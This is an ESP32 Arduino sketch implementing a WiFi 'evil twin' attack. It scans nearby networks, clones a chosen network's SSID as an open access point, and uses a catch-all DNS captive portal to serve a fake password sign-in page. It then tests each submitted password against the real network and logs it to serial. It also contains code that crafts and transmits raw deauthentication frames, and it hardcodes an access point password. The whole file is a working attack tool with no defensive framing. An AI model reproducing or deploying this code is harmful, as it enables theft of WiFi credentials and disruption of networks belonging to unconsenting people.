

#include <Arduino.h>
#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <esp_wifi.h>

typedef struct {
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
} _Network;

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 1, 1);
DNSServer dnsServer;
WebServer webServer(80);

_Network _networks[16];
_Network _selectedNetwork;

void clearArray() {
  for (int i = 0; i < 16; i++) {
    _Network _network;
    _networks[i] = _network;
  }
}

String _correct = "";
String _tryPassword = "";

void performScan() {
  int n = WiFi.scanNetworks();
  clearArray();
  if (n >= 0) {
    for (int i = 0; i < n && i < 16; ++i) {
      _Network network;
      network.ssid = WiFi.SSID(i);
      for (int j = 0; j < 6; j++) {
        network.bssid[j] = WiFi.BSSID(i)[j];
      }
      network.ch = WiFi.channel(i);
      _networks[i] = network;
    }
  }
}

String bytesToStr(const uint8_t* b, uint32_t size) {
  String str;
  const char ZERO = '0';
  const char DOUBLEPOINT = ':';
  for (uint32_t i = 0; i < size; i++) {
    if (b[i] < 0x10) str += ZERO;
    str += String(b[i], HEX);
    if (i < size - 1) str += DOUBLEPOINT;
  }
  return str;
}

bool hotspot_active = false;
bool deauthing_active = false;

void sendDeauth() {
  uint8_t deauthPacket[26] = {
    0xc0, 0x00, 0x3a, 0x01,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    _selectedNetwork.bssid[0], _selectedNetwork.bssid[1], _selectedNetwork.bssid[2], 
    _selectedNetwork.bssid[3], _selectedNetwork.bssid[4], _selectedNetwork.bssid[5],
    _selectedNetwork.bssid[0], _selectedNetwork.bssid[1], _selectedNetwork.bssid[2], 
    _selectedNetwork.bssid[3], _selectedNetwork.bssid[4], _selectedNetwork.bssid[5],
    0x00, 0x00
  };

  esp_wifi_set_channel(_selectedNetwork.ch, WIFI_SECOND_CHAN_NONE);
  esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);
}

unsigned long now = 0;
unsigned long deauth_now = 0;
unsigned long wifinow = 0;

String header() {
  return "<!DOCTYPE html><html><head><title>Sign in</title>"
         "<meta name='viewport' content='width=device-width, initial-scale=1'>"
         "<style>"
         "body { background: #121212; color: #e0e0e0; font-family: sans-serif; padding: 10px; }"
         "</style></head><body>";
}

String footer() {
  return "</body></html>";
}

String index() {
  String ssid = String(_selectedNetwork.ssid);
  String html = header();
  html += "<h1>Connect to " + ssid + "</h1>"
          "<form method='POST' action='/'>"
          "<label>Password:</label><br>"
          "<input type='password' name='password'><br><br>"
          "<button type='submit'>Connect</button>"
          "</form>";
  html += footer();
  return html;
}

void handleIndex() {
  if (webServer.hasArg("ap")) {
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap")) {
        _selectedNetwork = _networks[i];
      }
    }
  }

  if (webServer.hasArg("hotspot")) {
    if (webServer.arg("hotspot") == "start") {
      hotspot_active = true;
      dnsServer.stop();
      WiFi.softAPdisconnect(true);
      WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
      WiFi.softAP(_selectedNetwork.ssid.c_str(), nullptr, _selectedNetwork.ch);
      dnsServer.start(DNS_PORT, "*", apIP);
    } else if (webServer.arg("hotspot") == "stop") {
      hotspot_active = false;
      dnsServer.stop();
      WiFi.softAPdisconnect(true);
      WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
      WiFi.softAP("TechChip_MCU", "swathi123");
      dnsServer.start(DNS_PORT, "*", apIP);
    }
  }

  if (hotspot_active == false) {
    String _html = header();
    _html += "<h2>Networks:</h2><ul>";
    for (int i = 0; i < 16; ++i) {
      if (_networks[i].ssid == "") break;
      _html += "<li>" + _networks[i].ssid + " (Ch: " + String(_networks[i].ch) + ") ";
      _html += "<form method='post' action='/?ap=" + bytesToStr(_networks[i].bssid, 6) + "'>";
      _html += "<button>Select</button></form></li>";
    }
    _html += "</ul>";

    if (_selectedNetwork.ssid != "") {
      _html += "<form method='post' action='/?hotspot=start'><button>Start Evil Twin</button></form>";
    }

    _html += footer();
    webServer.send(200, "text/html", _html);
  } else {
    if (webServer.hasArg("password")) {
      _tryPassword = webServer.arg("password");
      Serial.println("Trying password: " + _tryPassword);

      WiFi.disconnect();
      WiFi.begin(_selectedNetwork.ssid.c_str(), _tryPassword.c_str(), _selectedNetwork.ch, _selectedNetwork.bssid);

      String html = header();
      html += "<h1>Connecting...</h1>";
      html += footer();
      webServer.send(200, "text/html", html);
    } else {
      webServer.send(200, "text/html", index());
    }
  }
}

void setup() {
  Serial.begin(115200);
  WiFi.mode(WIFI_AP_STA);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP("TechChip_MCU", "swathi123");

  dnsServer.start(DNS_PORT, "*", apIP);

  webServer.on("/", handleIndex);
  webServer.onNotFound(handleIndex);
  webServer.begin();

  performScan();
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();

  if (deauthing_active && (millis() - deauth_now >= 100)) {
    sendDeauth();
    deauth_now = millis();
  }

  if (millis() - now >= 15000) {
    performScan();
    now = millis();
  }

  if (millis() - wifinow >= 2000) {
    if (WiFi.status() != WL_CONNECTED) {
      Serial.println("BAD");
    } else {
      Serial.println("GOOD");
    }
    wifinow = millis();
  }
}
